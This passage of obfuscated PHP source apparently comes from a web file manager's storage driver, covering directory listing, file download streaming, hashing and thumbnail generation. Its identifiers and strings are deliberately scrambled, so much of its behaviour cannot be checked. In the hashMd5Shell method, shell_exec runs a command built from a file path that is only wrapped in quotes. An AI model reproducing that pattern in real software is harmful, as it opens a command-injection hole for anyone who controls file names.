$Ó¾ë“ƒâ = $this->pathDriver; if (substr($Ü÷Î´ÂÀ[$¬¿·Ÿ—ê[87]], 0, strlen($Ó¾ë“ƒâ)) == $Ó¾ë“ƒâ) { $ªõˆ°Ä = substr($ªõˆ°Ä, strlen($Ó¾ë“ƒâ)); } $this->listAllMake($ªõˆ°Ä, $©õı ®¬); } } public function listAllSimple($’æÎ½¹, $×¡§¹‰ = false) { $íñÈÇ = $this->listAll($’æÎ½¹); return $this->listAllSimpleMake($íñÈÇ, $this->getPathOuter($’æÎ½¹), $×¡§¹‰); } public function listAllSimpleMake($ş„’Áß½, $È½¦ÍÀœ, $ÙÛËéÑ¡) { $‹ ¾—‘¬ =& $_SERVER[£ğ°ÖØø]; $¶‰ÒúŒÀ = array(); $È½¦ÍÀœ = rtrim(get_path_father($È½¦ÍÀœ), $‹ ¾—‘¬[8]) . $‹ ¾—‘¬[8]; foreach ($ş„’Áß½ as $€ÏØãªâ) { $áÉ®½³È = array($‹ ¾—‘¬[87] => $€ÏØãªâ[$‹ ¾—‘¬[87]], $‹ ¾—‘¬[89] => $€ÏØãªâ[$‹ ¾—‘¬[87]], $‹ ¾—‘¬[78] => $€ÏØãªâ[$‹ ¾—‘¬[78]]); if (isset($€ÏØãªâ[$‹ ¾—‘¬[79]]) && !$€ÏØãªâ[$‹ ¾—‘¬[78]]) { $áÉ®½³È[$‹ ¾—‘¬[79]] = $€ÏØãªâ[$‹ ¾—‘¬[79]]; } if (isset($€ÏØãªâ[$‹ ¾—‘¬[88]])) { $áÉ®½³È[$‹ ¾—‘¬[88]] = $€ÏØãªâ[$‹ ¾—‘¬[88]]; } if (is_array($€ÏØãªâ[$‹ ¾—‘¬[90]])) { $áÉ®½³È[$‹ ¾—‘¬[89]] = $€ÏØãªâ[$‹ ¾—‘¬[90]][$‹ ¾—‘¬[87]]; $áÉ®½³È[$‹ ¾—‘¬[79]] = $€ÏØãªâ[$‹ ¾—‘¬[90]][$‹ ¾—‘¬[79]]; $áÉ®½³È[$‹ ¾—‘¬[88]] = $€ÏØãªâ[$‹ ¾—‘¬[90]][$‹ ¾—‘¬[88]]; } else { if (substr($€ÏØãªâ[$‹ ¾—‘¬[87]], 0, strlen($È½¦ÍÀœ)) == $È½¦ÍÀœ) { $áÉ®½³È[$‹ ¾—‘¬[87]] = substr($€ÏØãªâ[$‹ ¾—‘¬[87]], strlen($È½¦ÍÀœ)); } } $…¢ú‚àÊ = $€ÏØãªâ[$‹ ¾—‘¬[78]] ? $‹ ¾—‘¬[8] : $‹ ¾—‘¬[12]; $áÉ®½³È[$‹ ¾—‘¬[89]] = rtrim($áÉ®½³È[$‹ ¾—‘¬[89]], $‹ ¾—‘¬[8]) . $…¢ú‚àÊ; $áÉ®½³È[$‹ ¾—‘¬[87]] = $‹ ¾—‘¬[8] . trim($áÉ®½³È[$‹ ¾—‘¬[87]], $‹ ¾—‘¬[8]) . $…¢ú‚àÊ; if (!$ÙÛËéÑ¡) { $Ù¡ Âãè = explode($‹ ¾—‘¬[8], trim($áÉ®½³È[$‹ ¾—‘¬[87]], $‹ ¾—‘¬[8])); $áÉ®½³È[$‹ ¾—‘¬[87]] = $‹ ¾—‘¬[8] . implode($‹ ¾—‘¬[8], array_slice($Ù¡ Âãè, 1)) . $…¢ú‚àÊ; } $¶‰ÒúŒÀ[] = $áÉ®½³È; } return array_sort_by($¶‰ÒúŒÀ, $‹ ¾—‘¬[87]); } public function upload($ğŠıí», $‰¢¡ „¬, $¼Û€ë÷ö = false, $à€øç‹ = REPEAT_REPLACE) { } public function uploadFileByID($œåÄ²œî, $ìï·¨Øš, $€õêá§Ê) { } public function uploadFileByPath($ûî€ˆÎ, $ÔşÛ©†ñ, $ƒ¡šâ•… = array()) { } public function isUploadServer() { $·–šùİÈ =& $_SERVER[£ğ°ÖØø]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $·–šùİÈ[91]) { return !0; } return $GLOBALS[$·–šùİÈ[6]][$·–šùİÈ[92]][$·–šùİÈ[93]]; } public function isFileOutServer() { $‚ÏêÑØ =& $_SERVER[£ğ°ÖØø]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $‚ÏêÑØ[91]) { return !0; } return $GLOBALS[$‚ÏêÑØ[6]][$‚ÏêÑØ[92]][$‚ÏêÑØ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($æ¹º×Şº) { $ˆªî¥å‹ =& $_SERVER[£ğ°ÖØø]; if (!$this->isCdnHost()) { return $æ¹º×Şº; } return str_replace(trim(get_url_root($æ¹º×Şº), $ˆªî¥å‹[8]), trim($this->cdnHost, $ˆªî¥å‹[8]), $æ¹º×Şº); } public function uploadLink($ºÕüÁÓ, $¦âò«ÖÔ = 0) { $‘÷§Ë€» =& $_SERVER[£ğ°ÖØø]; if ($this->isUploadServer()) { return; } $Ü“öÏÍò = $this->getType(); if (!in_array($Ü“öÏÍò, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¨ƒˆèéü = 1024 * 1024 * 10; $ƒ’Íë÷ô = $¦âò«ÖÔ <= $¨ƒˆèéü ? $‘÷§Ë€»[95] : $‘÷§Ë€»[96]; $”±¦Òˆ = (!$¦âò«ÖÔ ? 1 : ceil($¦âò«ÖÔ / pow(1024, 3))) * 3600 * 4; $’Ô¼‰öÁ = $this->{$ƒ’Íë÷ô}($ºÕüÁÓ, $”±¦Òˆ); if ($’Ô¼‰öÁ) { $’Ô¼‰öÁ[$‘÷§Ë€»[97]] = $ºÕüÁÓ; $’Ô¼‰öÁ[$‘÷§Ë€»[98]] = $Ü“öÏÍò; } return $’Ô¼‰öÁ; } public function uploadFormData($àô‚İ¦, $ Ş¦éÕ— = 3600) { } public function multiUploadFormData($ŒÅğÍ¯, $Ş¡ñÅó© = 3600) { } public function download($éä¼øßÅ, $¬™ô­şò) { } public function ext($ãÒí“à’) { $ûÃ–’â =& $_SERVER[£ğ°ÖØø]; if (strpos($ãÒí“à’, $ûÃ–’â[8]) === -1) { $“úøÆ‡ˆ = $ãÒí“à’; } else { $“úøÆ‡ˆ = $this->pathThis($ãÒí“à’); } $²›äß ‘ = $ûÃ–’â[12]; if (strstr($“úøÆ‡ˆ, $ûÃ–’â[10])) { $²›äß ‘ = substr($“úøÆ‡ˆ, strrpos($“úøÆ‡ˆ, $ûÃ–’â[10]) + 1); $²›äß ‘ = strtolower($²›äß ‘); } if (strlen($²›äß ‘) > 3 && preg_match($ûÃ–’â[99], $²›äß ‘, $ø´ø¯¯¢)) { $²›äß ‘ = $ûÃ–’â[12]; } return $²›äß ‘; } public function pathThis($¹à…½èĞ) { $Û·Øµ =& $_SERVER[£ğ°ÖØø]; $¹à…½èĞ = str_replace($Û·Øµ[100], $Û·Øµ[8], rtrim($¹à…½èĞ, $Û·Øµ[8])); $ÇÁ‹ª²« = strrpos($¹à…½èĞ, $Û·Øµ[8]); if ($ÇÁ‹ª²« === !1) { return $¹à…½èĞ; } return substr($¹à…½èĞ, $ÇÁ‹ª²« + 1); } public function pathFather($Õîê—¸Š) { $ß·Ä—öì =& $_SERVER[£ğ°ÖØø]; $Õîê—¸Š = str_replace($ß·Ä—öì[100], $ß·Ä—öì[8], rtrim($Õîê—¸Š, $ß·Ä—öì[8])); $ıÅ¤º¿” = strrpos($Õîê—¸Š, $ß·Ä—öì[8]); if ($ıÅ¤º¿” === !1) { return $ß·Ä—öì[12]; } return substr($Õîê—¸Š, 0, $ıÅ¤º¿” + 1); } public function hashSimple($‘€øÚ¬©) { $‚¥Ûê‰‹ =& $_SERVER[£ğ°ÖØø]; if (!$‘€øÚ¬©) { return md5($‚¥Ûê‰‹[12]); } $Œ³ú¹Œ = $this->size($‘€øÚ¬©); $©âÏüö = 200; $õîÆ¸„™ = 50; if ($Œ³ú¹Œ <= $©âÏüö * $õîÆ¸„™) { return $this->hashMd5($‘€øÚ¬©) . $Œ³ú¹Œ; } $´‰©§Ó¼ = intval($Œ³ú¹Œ / $õîÆ¸„™); $«Û£¢¡‹ = $‚¥Ûê‰‹[12]; for ($ËÊ­àç™ = 0; $ËÊ­àç™ < $õîÆ¸„™; $ËÊ­àç™++) { $«Û£¢¡‹ .= $this->fileSubstr($‘€øÚ¬©, $´‰©§Ó¼ * $ËÊ­àç™, $©âÏüö); } $«Û£¢¡‹ .= $this->fileSubstr($‘€øÚ¬©, $Œ³ú¹Œ - $©âÏüö, $©âÏüö); return md5($«Û£¢¡‹) . $Œ³ú¹Œ; } public static $md5Cache = array(); public function hashMd5($²å¼Î„©) { if (!$²å¼Î„©) { return md5($_SERVER[£ğ°ÖØø][12]); } $²å¼Î„© = $this->iconvSystem($²å¼Î„©); if (isset(self::$md5Cache[$²å¼Î„©])) { return self::$md5Cache[$²å¼Î„©]; } self::$md5Cache[$²å¼Î„©] = $this->hashMd5Shell($²å¼Î„©); if (!self::$md5Cache[$²å¼Î„©]) { self::$md5Cache[$²å¼Î„©] = @md5_file($²å¼Î„©); } return self::$md5Cache[$²å¼Î„©]; } private function hashMd5Shell($æííÏõÀ) { $¨ûÜ»¯š =& $_SERVER[£ğ°ÖØø]; if (!$æííÏõÀ) { return md5($¨ûÜ»¯š[12]); } if (!function_exists($¨ûÜ»¯š[101])) { return !1; } $ÊŒ«îØ‰ = array($¨ûÜ»¯š[102], $¨ûÜ»¯š[103]); $«Ò·¿òÂ = Cache::get($¨ûÜ»¯š[104]); if (!$«Ò·¿òÂ) { $Õ¼úˆŞ = BASIC_PATH . $¨ûÜ»¯š[105]; $½©¢ï = md5_file($Õ¼úˆŞ); $«Ò·¿òÂ = $¨ûÜ»¯š[106]; foreach ($ÊŒ«îØ‰ as $û–¦³ÍÎ) { $¶‡½Í˜† = shell_exec($û–¦³ÍÎ . "\40\x22{$Õ¼úˆŞ}\x22"); if ($¶‡½Í˜† && substr(trim($¶‡½Í˜†), 0, 32) == $½©¢ï) { $«Ò·¿òÂ = $û–¦³ÍÎ; break; } } Cache::set($¨ûÜ»¯š[104], $«Ò·¿òÂ, 3600); } if ($«Ò·¿òÂ == $¨ûÜ»¯š[106]) { return !1; } $¶‡½Í˜† = shell_exec($«Ò·¿òÂ . "\40\42{$æííÏõÀ}\42"); $¶‡½Í˜† = str_replace($¨ûÜ»¯š[107], $¨ûÜ»¯š[12], $¶‡½Í˜†); return substr($¶‡½Í˜†, 0, 32); } public function link($Õ•¨ÀÊª) { return $Õ•¨ÀÊª; } public function fileOut($¬à›™‹İ, $ª¤‚í½¹ = false, $¦ÔÃÉçÛ = false, $¥áìÈïÄ = '') { $èĞåÒØ• =& $_SERVER[£ğ°ÖØø]; $this->cacheMethod(null, null); if (!$¬à›™‹İ || !$this->exist($¬à›™‹İ)) { show_json(LNG($èĞåÒØ•[108]), !1, $¦ÔÃÉçÛ); } $à¥ƒ—Ãú = $this->getType() == $èĞåÒØ•[109]; $é†ö©²õ = $GLOBALS[$èĞåÒØ•[6]][$èĞåÒØ•[92]][$èĞåÒØ•[110]][$èĞåÒØ•[111]]; $ºÏÔ”¯Û = (double) $GLOBALS[$èĞåÒØ•[6]][$èĞåÒØ•[92]][$èĞåÒØ•[110]][$èĞåÒØ•[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $™—µ˜ÙÆ = $this->infoFull($¬à›™‹İ); $È»‹”Óû = $™—µ˜ÙÆ[$èĞåÒØ•[79]]; $â½«•Í = gmdate($èĞåÒØ•[113], $™—µ˜ÙÆ[$èĞåÒØ•[88]]); $´İ‡¶Šæ = $¦ÔÃÉçÛ ? $¦ÔÃÉçÛ : $this->iconvApp($™—µ˜ÙÆ[$èĞåÒØ•[32]]); $˜›”†¼ = 0; $°—ºôúÊ = $È»‹”Óû - 1; $£³¿¢ô® = $this->ext($´İ‡¶Šæ); if (in_array($£³¿¢ô®, array($èĞåÒØ•[114], $èĞåÒØ•[115], $èĞåÒØ•[116], $èĞåÒØ•[117]))) { $£³¿¢ô® = $èĞåÒØ•[118]; } if (in_array($£³¿¢ô®, array($èĞåÒØ•[119]))) { $£³¿¢ô® = $èĞåÒØ•[120]; } if (!$¥áìÈïÄ) { $¥áìÈïÄ = md5($â½«•Í . $È»‹”Óû); } $¥áìÈïÄ = $èĞåÒØ•[121] . $¥áìÈïÄ . $èĞåÒØ•[121]; $ºš“š§ = get_file_mime($£³¿¢ô®); $£æÆûï¢ = !0; $£æÆûï¢ = isset($_GET[$èĞåÒØ•[122]]) ? !1 : !0; if ($ª¤‚í½¹ === !1 && !mime_support($ºš“š§)) { $ºš“š§ = $èĞåÒØ•[123]; } header($èĞåÒØ•[124]); header($èĞåÒØ•[125] . $ºš“š§); $êÄ‰ÓÅÓ = rawurlencode($´İ‡¶Šæ); $êÄ‰ÓÅÓ = $èĞåÒØ•[121] . $êÄ‰ÓÅÓ . $èĞåÒØ•[126] . $êÄ‰ÓÅÓ; if ($ª¤‚í½¹) { header($èĞåÒØ•[127]); header($èĞåÒØ•[128] . $êÄ‰ÓÅÓ); } else { if ($£æÆûï¢) { header($èĞåÒØ•[129] . $êÄ‰ÓÅÓ); } } $Í‚øÙ­ß = 3600 * 24 * 30; header($èĞåÒØ•[130]); header($èĞåÒØ•[131]); header($èĞåÒØ•[132] . $Í‚øÙ­ß); header($èĞåÒØ•[133] . gmdate($èĞåÒØ•[113], time() + $Í‚øÙ­ß) . $èĞåÒØ•[134]); if (isset($_SERVER[$èĞåÒØ•[135]]) && strtotime($_SERVER[$èĞåÒØ•[135]]) == $™—µ˜ÙÆ[$èĞåÒØ•[88]]) { header($èĞåÒØ•[136], !0, 304); die; } if (isset($_SERVER[$èĞåÒØ•[137]]) && $_SERVER[$èĞåÒØ•[137]] == $¥áìÈïÄ) { header($èĞåÒØ•[138] . $¥áìÈïÄ, !0, 304); die; } header($èĞåÒØ•[138] . $¥áìÈïÄ); header($èĞåÒØ•[139] . $â½«•Í . $èĞåÒØ•[134]); header($èĞåÒØ•[140] . $´İ‡¶Šæ); header($èĞåÒØ•[141]); header($èĞåÒØ•[142] . $È»‹”Óû); header($èĞåÒØ•[143]); Hook::trigger($èĞåÒØ•[144], $¬à›™‹İ, $È»‹”Óû, $´İ‡¶Šæ, $£³¿¢ô®); if (!$ª¤‚í½¹ && $£³¿¢ô® == $èĞåÒØ•[145]) { if ($È»‹”Óû > 1024 * 1024 * 5) { die; } $®³é·¬« = $this->getContent($¬à›™‹İ); $®³é·¬« = Html::clearSVG($®³é·¬«); header($èĞåÒØ•[146] . strlen($®³é·¬«)); echo $®³é·¬«; die; } $ÔüõÀ” = strtolower($_SERVER[$èĞåÒØ•[147]]); if ($à¥ƒ—Ãú && $ÔüõÀ” && $é†ö©²õ) { if (strstr($ÔüõÀ”, $èĞåÒØ•[148])) { header($èĞåÒØ•[149] . $¬à›™‹İ); } else { if (strstr($ÔüõÀ”, $èĞåÒØ•[150])) { header($èĞåÒØ•[151] . $¬à›™‹İ); } else { if (strstr($ÔüõÀ”, $èĞåÒØ•[152])) { header($èĞåÒØ•[153] . $¬à›™‹İ); } } } if ($ºÏÔ”¯Û) { header($èĞåÒØ•[154] . $ºÏÔ”¯Û); } return; } if (isset($_SERVER[$èĞåÒØ•[155]])) { if (preg_match($èĞåÒØ•[156], $_SERVER[$èĞåÒØ•[155]], $ÉïÈ¹åÉ)) { $˜›”†¼ = intval($ÉïÈ¹åÉ[1]); $˜›”†¼ = $˜›”†¼ <= 0 ? 0 : ($˜›”†¼ >= $°—ºôúÊ ? $°—ºôúÊ : $˜›”†¼); if (!empty($ÉïÈ¹åÉ[2])) { $ˆ¯Ï¾»¶ = intval($ÉïÈ¹åÉ[2]); $°—ºôúÊ = $ˆ¯Ï¾»¶ < $˜›”†¼ ? $˜›”†¼ : ($ˆ¯Ï¾»¶ >= $°—ºôúÊ ? $°—ºôúÊ : $ˆ¯Ï¾»¶); } } header($èĞåÒØ•[157]); header("\103\x6f\156\x74\145\x6e\164\55\x52\141\x6e\147\x65\x3a\x20\x62\x79\x74\x65\163\40{$˜›”†¼}\x2d{$°—ºôúÊ}\x2f" . $È»‹”Óû); } else { header($èĞåÒØ•[158]); } header($èĞåÒØ•[159]); header($èĞåÒØ•[160]); $å‡ú·§ê = !0; if ($_SERVER[$èĞåÒØ•[161]] == $èĞåÒØ•[162] && $È»‹”Óû > 1204 * 1024 * 1024 * 2) { $å‡ú·§ê = !1; } if ($å‡ú·§ê) { header($èĞåÒØ•[163] . ($°—ºôúÊ - $˜›”†¼ + 1)); } if ($_SERVER[$èĞåÒØ•[164]] == $èĞåÒØ•[165]) { return; } $»£‚»ğÒ = array($èĞåÒØ•[166] => !1, $èĞåÒØ•[167] => $˜›”†¼, $èĞåÒØ•[168] => $°—ºôúÊ, $èĞåÒØ•[169] => $£³¿¢ô®, $èĞåÒØ•[170] => $™—µ˜ÙÆ, $èĞåÒØ•[171] => $èĞåÒØ•[12], $èĞåÒØ•[172] => 0); $»£‚»ğÒ = Hook::filter($èĞåÒØ•[173], $»£‚»ğÒ); $÷æôè±´ = 1024 * 300; $ïİñè = 0; if ($ºÏÔ”¯Û) { $ïİñè = intval(1000 * 1000 * ($÷æôè±´ / $ºÏÔ”¯Û)); } while ($˜›”†¼ <= $°—ºôúÊ) { $ÓØÔ˜ı® = timeFloat(); check_abort(); $ÏÚ—£øˆ = $°—ºôúÊ - $˜›”†¼ + 1; if ($ÏÚ—£øˆ <= $÷æôè±´) { $÷æôè±´ = $ÏÚ—£øˆ; } $®³é·¬« = $this->fileSubstr($¬à›™‹İ, $˜›”†¼, $÷æôè±´); if ($»£‚»ğÒ[$èĞåÒØ•[166]]) { $»£‚»ğÒ[$èĞåÒØ•[171]] = $®³é·¬«; $»£‚»ğÒ[$èĞåÒØ•[172]] = $˜›”†¼; $»£‚»ğÒ = Hook::filter($èĞåÒØ•[174], $»£‚»ğÒ); $®³é·¬« = $»£‚»ğÒ[$èĞåÒØ•[171]]; } echo $®³é·¬«; $˜›”†¼ += $÷æôè±´; if ($÷æôè±´ == $ÏÚ—£øˆ) { $˜›”†¼ = $°—ºôúÊ + 1; } if ($ïİñè) { $®ÎŸ¿Œ” = intval(1000 * 1000 * (timeFloat() - $ÓØÔ˜ı®)); $Ğï®íÇ» = $ïİñè - $®ÎŸ¿Œ”; if ($Ğï®íÇ» > 5) { usleep($Ğï®íÇ»); } } } } public function fileOutServer($¾òîûÎ, $ËÃ¨ÈÒì = false, $‚ùÁÌ¨ = false, $–‰Åƒñ¡ = '') { $this->fileOut($¾òîûÎ, $ËÃ¨ÈÒì, $‚ùÁÌ¨, $–‰Åƒñ¡); } public function fileOutLink($ûù²ìÆÕ) { header($_SERVER[£ğ°ÖØø][175] . $ûù²ìÆÕ); die; } public function cacheMethod($®±…†—ğ, $÷Ãç·×, $ ÑĞ° = null) { $±ÈÔ½¢ =& $_SERVER[£ğ°ÖØø]; static $¡÷Ààé¡ = array(); $è­¿Ò½Â = $÷Ãç·× ? ltrim($this->getPathOuter($÷Ãç·×), $±ÈÔ½¢[8]) : $±ÈÔ½¢[12]; $¬èäøÊ” = $±ÈÔ½¢[176] . $®±…†—ğ . $±ÈÔ½¢[177] . rtrim($è­¿Ò½Â, $±ÈÔ½¢[8]); if (is_null($®±…†—ğ)) { $¡÷Ààé¡ = array(); return; } if (is_null($÷Ãç·×)) { foreach ($¡÷Ààé¡ as $¬èäøÊ” => $‚ùŞéò‹) { if (!strstr($¬èäøÊ”, $±ÈÔ½¢[176] . $®±…†—ğ . $±ÈÔ½¢[178])) { continue; } unset($¡÷Ààé¡[$¬èäøÊ”]); } return; } if (!is_null($ ÑĞ°)) { $¡÷Ààé¡[$¬èäøÊ”] = $ ÑĞ°; return; } $Ô§Ä®ó› = isset($¡÷Ààé¡[$¬èäøÊ”]) ? $¡÷Ààé¡[$¬èäøÊ”] : null; if (!is_null($Ô§Ä®ó›)) { return $Ô§Ä®ó›; } $Ô§Ä®ó› = $this->{$®±…†—ğ}($÷Ãç·×); $¡÷Ààé¡[$¬èäøÊ”] = $Ô§Ä®ó›; return $Ô§Ä®ó›; } public function cacheMethodInfoSet($—óÌÍÖ, $Çªí·†³, $Ã´‰ˆŞ = false) { $‚°ÔÌ¦ =& $_SERVER[£ğ°ÖØø]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($‚°ÔÌ¦[179], $—óÌÍÖ, $Çªí·†³); $this->cacheMethod($‚°ÔÌ¦[180], $—óÌÍÖ, $Çªí·†³ ? !1 : !0); if (is_array($Ã´‰ˆŞ)) { $this->cacheMethod($‚°ÔÌ¦[181], $—óÌÍÖ, $Ã´‰ˆŞ); } } public function fileOutImage($¦âûñùÊ, $è„¬º = 250) { $ÓÖÎî =& $_SERVER[£ğ°ÖØø]; set_timeout(); if (substr($¦âûñùÊ, 0, 4) == $ÓÖÎî[152]) { $this->fileOutLink($¦âûñùÊ); } $Á¤Ñ•ˆİ = $this->info($¦âûñùÊ); $«Çù¨ŠÒ = !1; $‹µ„ÈáŸ = isset($GLOBALS[$ÓÖÎî[182]]) ? $GLOBALS[$ÓÖÎî[182]] : array(); if ($‹µ„ÈáŸ && $‹µ„ÈáŸ[$ÓÖÎî[183]] == $Á¤Ñ•ˆİ[$ÓÖÎî[87]]) { $Á¤Ñ•ˆİ = $‹µ„ÈáŸ; $»õ‘ÑÈš = $Á¤Ñ•ˆİ[$ÓÖÎî[184]]; if ($»õ‘ÑÈš && isset($»õ‘ÑÈš[$ÓÖÎî[185]])) { if ($»õ‘ÑÈš[$ÓÖÎî[185]] <= $è„¬º && $»õ‘ÑÈš[$ÓÖÎî[186]] <= $è„¬º) { $«Çù¨ŠÒ = !0; } } } if ($Á¤Ñ•ˆİ[$ÓÖÎî[79]] <= 1024 * 50 || $«Çù¨ŠÒ || !function_exists($ÓÖÎî[187]) || $Á¤Ñ•ˆİ[$ÓÖÎî[169]] == $ÓÖÎî[188]) { return $this->fileOut($¦âûñùÊ, !1, $Á¤Ñ•ˆİ[$ÓÖÎî[32]]); } $İ†úÒ×ë = kodIO::hashPath($Á¤Ñ•ˆİ); $ĞØšâúÕ = "\143\x6f\x76\x65\162\x5f{$İ†úÒ×ë}\137{$è„¬º}\56\x70\156\147"; $·°¿ıòã = IO_PATH_SYSTEM_TEMP . $ÓÖÎî[189]; $Ã—Äö¾Á = IO::infoFullSimple($·°¿ıòã); $°“×™çø = $Ã—Äö¾Á && is_array($Ã—Äö¾Á) ? $Ã—Äö¾Á[$ÓÖÎî[87]] : $ÓÖÎî[12]; if (!$°“×™çø) { $°“×™çø = IO::mkdir($·°¿ıòã); } if ($Á¤Ñ•ˆİ[$ÓÖÎî[190]] == $ÓÖÎî[191] && isset($Á¤Ñ•ˆİ[$ÓÖÎî[192]]) && $Á¤Ñ•ˆİ[$ÓÖÎî[192]] == kodIO::sourceID($°“×™çø)) { $ïòş¡û– = $Á¤Ñ•ˆİ[$ÓÖÎî[193]]; if ($è„¬º <= 500) { $šÅ¶ª ® = preg_replace($ÓÖÎî[194], $ÓÖÎî[195], $Á¤Ñ•ˆİ[$ÓÖÎî[32]]); $ïòş¡û– = IO::fileNameExist($°“×™çø, $šÅ¶ª ®); } return IO::fileOut(KodIO::make($ïòş¡û–), !1, $Á¤Ñ•ˆİ[$ÓÖÎî[32]]); } $íÔÀÚÁ× = IO::fileNameExist($°“×™çø, $ĞØšâúÕ); if ($íÔÀÚÁ×) { return IO::fileOut(KodIO::make($íÔÀÚÁ×), !1, $Á¤Ñ•ˆİ[$ÓÖÎî[32]]); } if ($è„¬º > 1000) { $this->makeImageCover($°“×™çø, $¦âûñùÊ, $ĞØšâúÕ, $è„¬º); $this->makeImageCover($°“×™çø, $¦âûñùÊ, "\143\157\166\145\162\x5f{$İ†úÒ×ë}\x5f\62\x35\60\56\x70\x6e\x67", 250); $íÔÀÚÁ× = IO::fileNameExist($°“×™çø, $ĞØšâúÕ); if ($íÔÀÚÁ×) { return IO::fileOut(KodIO::make($íÔÀÚÁ×), !1, $Á¤Ñ•ˆİ[$ÓÖÎî[32]]); } die; } $¥»´¨â = Cache::get($ĞØšâúÕ); if ($¥»´¨â == $ÓÖÎî[196] || $¥»´¨â == $ÓÖÎî[197]) { echo $¥»´¨â; die; } Cache::set($ĞØšâúÕ, $ÓÖÎî[197], 60); $‰ÇÒ€­‡ = array($°“×™çø, $Á¤Ñ•ˆİ[$ÓÖÎî[87]], $ĞØšâúÕ, $è„¬º); $‚²ØÊ¦ø = $ÓÖÎî[198] . $Á¤Ñ•ˆİ[$ÓÖÎî[79]] . $ÓÖÎî[199] . $ĞØšâúÕ . $ÓÖÎî[200] . $Á¤Ñ•ˆİ[$ÓÖÎî[32]] . $ÓÖÎî[201] . $Á¤Ñ•ˆİ[$ÓÖÎî[87]]; TaskQueue::add($ÓÖÎî[202], $‰ÇÒ€­‡, $‚²ØÊ¦ø, $ĞØšâúÕ); } public function makeImageCover($åÌ§¸ÏÒ, $œ¤¥¨ºµ, $õ±«­Úä, $¦òƒÛåÚ) { $¬šµíÎ =& $_SERVER[£ğ°ÖØø]; if (IO::fileNameExist($åÌ§¸ÏÒ, $õ±«­Úä)) { return $¬šµíÎ[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $íÉ´˜ßË = DATA_THUMB . $õ±«­Úä; del_file($íÉ´˜ßË); $”›àÉòš = IO::copy($œ¤¥¨ºµ, TEMP_FILES, !1, $õ±«­Úä); if (!@file_exists($”›àÉòš)) { return $¬šµíÎ[204]; } ImageThumb::createThumb($”›àÉòš, $íÉ´˜ßË, $¦òƒÛåÚ, $¦òƒÛåÚ * 10); if (@file_exists($íÉ´˜ßË)) { Cache::remove($õ±«­Úä); return IO::move($íÉ´˜ßË, $åÌ§¸ÏÒ); } Cache::set($õ±«­Úä, $¬šµíÎ[196], 600); del_file($íÉ´˜ßË); return $¬šµíÎ[205] . $”›àÉòš . $¬šµíÎ[74]; } public function fileOutImageServer($ÅœÎª¡º, $êé çÃğ = 250) { $this->fileOutImage($ÅœÎª¡º, $êé çÃğ); } public function fileNameAuto($Äû§¹ï, $Æ«éİ¹Ë, $×Ôå‚Ç = REPEAT_RENAME, $û¹€« = false) { $¯òòõÏ =& $_SERVER[£ğ°ÖØø]; $‹ûï‚ÃÅ = $Äû§¹ï === $¯òòõÏ[12] ? $Æ«éİ¹Ë : rtrim($Äû§¹ï, $¯òòõÏ[8]) . $¯òòõÏ[8] . $Æ«éİ¹Ë; if ($×Ôå‚Ç == REPEAT_REPLACE || !$this->exist($‹ûï‚ÃÅ) || $û¹€« && $×Ôå‚Ç != REPEAT_RENAME_FOLDER) { return $Æ«éİ¹Ë; } if ($×Ôå‚Ç == REPEAT_SKIP) { return !1; } $ªãĞš Ñ = $¯òòõÏ[10] . get_path_ext($Æ«éİ¹Ë); $ªãĞš Ñ = $ªãĞš Ñ == $¯òòõÏ[10] || $û¹€« ? $¯òòõÏ[12] : $ªãĞš Ñ; $ö¢üù¹ = 1; $Ÿ³şŠ®É = substr($Æ«éİ¹Ë, 0, strlen($Æ«éİ¹Ë) - strlen($ªãĞš Ñ)); $ò¬…ıÀ‰ = $Ÿ³şŠ®É . "\x28{$ö¢üù¹}\51{$ªãĞš Ñ}"; while ($this->exist(rtrim($Äû§¹ï, $¯òòõÏ[8]) . $¯òòõÏ[8] . $ò¬…ıÀ‰)) { $ò¬…ıÀ‰ = $Ÿ³şŠ®É . "\x28{$ö¢üù¹}\x29{$ªãĞš Ñ}"; $ö¢üù¹++; } return $ò¬…ıÀ‰; } private function fileNameAutoList($Ââ¥Ó»À, $áøøñŠ¨, $ˆÂ”¤°• = false) { $°øÎ£¡Ï =& $_SERVER[£ğ°ÖØø]; $µé„ª ù = $this->listPath($Ââ¥Ó»À, !0); $µé„ª ù = array_merge($µé„ª ù[$°øÎ£¡Ï[85]], $µé„ª ù[$°øÎ£¡Ï[86]]); $ú˜› Ëé = array_to_keyvalue($µé„ª ù, $°øÎ£¡Ï[12], $°øÎ£¡Ï[32]); $¼¶ûµéŞ = $°øÎ£¡Ï[10] . get_path_ext($áøøñŠ¨); $¼¶ûµéŞ = $¼¶ûµéŞ == $°øÎ£¡Ï[10] || $ˆÂ”¤°• ? $°øÎ£¡Ï[12] : $¼¶ûµéŞ; $ïˆÈ¼ö‚ = substr($áøøñŠ¨, 0, strlen($áøøñŠ¨) - strlen($¼¶ûµéŞ)); $À”½Öûš = $ïˆÈ¼ö‚ . "\50\60\x29{$¼¶ûµéŞ}"; for ($÷Ø×‰ùö = 1; $÷Ø×‰ùö <= count($ú˜› Ëé) + 1; $÷Ø×‰ùö++) { $À”½Öûš = $ïˆÈ¼ö‚ . "\50{$÷Ø×‰ùö}\x29{$¼¶ûµéŞ}"; if (!in_array_not_case($À”½Öûš, $ú˜› Ëé)) { return $À”½Öûš; } } return $À”½Öûš; } public function listAllFiles($‡õÇ†ã¹, $Šìú´¹ƒ) { $‚õÌĞ¸© =& $_SERVER[£ğ°ÖØø]; if (empty($Šìú´¹ƒ)) { return array(); } $÷ùÓßÍ… = array_keys($Šìú´¹ƒ); $™†ıª’« = array(); $‡õÇ†ã¹ = trim($‡õÇ†ã¹, $‚õÌĞ¸©[8]); foreach ($Šìú´¹ƒ as $ØŒ¤‡Â => $Æ™İ¢Üì) { $«Ğ®Ò•¯ = ltrim(substr(trim($ØŒ¤‡Â, $‚õÌĞ¸©[8]), strlen($‡õÇ†ã¹)), $‚õÌĞ¸©[8]); if (substr($ØŒ¤‡Â, -1) == $‚õÌĞ¸©[8]) { $«Ğ®Ò•¯ = rtrim($«Ğ®Ò•¯, $‚õÌĞ¸©[8]) . 